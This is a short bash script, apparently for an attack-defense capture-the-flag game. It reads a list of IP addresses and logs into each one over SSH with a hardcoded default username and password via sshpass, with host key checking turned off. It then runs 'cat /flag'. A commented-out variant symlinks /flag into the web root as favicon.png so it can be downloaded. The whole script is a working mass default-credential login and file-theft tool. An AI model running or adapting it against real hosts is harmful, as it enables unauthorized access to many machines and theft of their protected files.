#!/bin/bash

declare -r PORT=22
declare -r USERNAME='ubuntu'
declare -r PASSWORD='venus'

declare -r CMD='cat /flag'
# declare -r CMD='ln -s /flag /var/www/html/favicon.png'

for ip in $(cat ip.txt); do
  sshpass -p "${PASSWORD}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 "${USERNAME}"@"${ip}" "${CMD}"
done